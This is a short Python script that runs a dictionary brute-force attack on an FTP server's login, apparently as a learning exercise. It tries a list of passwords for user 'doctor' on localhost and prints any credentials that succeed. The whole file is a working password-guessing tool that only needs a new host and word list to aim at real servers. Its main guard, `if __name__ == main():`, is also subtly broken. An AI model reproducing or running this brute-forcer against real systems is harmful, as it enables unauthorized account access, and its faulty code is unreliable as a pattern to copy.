from ftplib import FTP


# return True if login is correct else false
def isCorrectLogin(server_host, username, password):
    print(f"\nTrying password '{password}' for '{username}@{server_host}'.............")
    # making ftp connection with the server
    try:
        ftp = FTP(server_host)
        # trying logging in
        ftp.login(username, password)
        return True
    except Exception:
        print("Status : No match")
        return False
    pass


def dictAttack(host, user, passList):
    for password in passList:
        if isCorrectLogin(host, user, password):
            print("Status : Match")
            print(f"Found USER = '{user}',  PASSWORD = '{password}'\n")
            return True
    return False


def main():
    server_host = "localhost"
    pList = ["root", "hello", "getlost", "beautiful", "doctr", "endlist"]
    uname = "doctor"
    # pword = "doctor"
    # if distAttack is not success meaning no match found print the below message
    if not dictAttack(server_host, uname, pList):
        print("\n...............................................\n")
        print(
            "End of word list for password. No credentials matched. Try Updating the list"
        )


if __name__ == main():
    main()
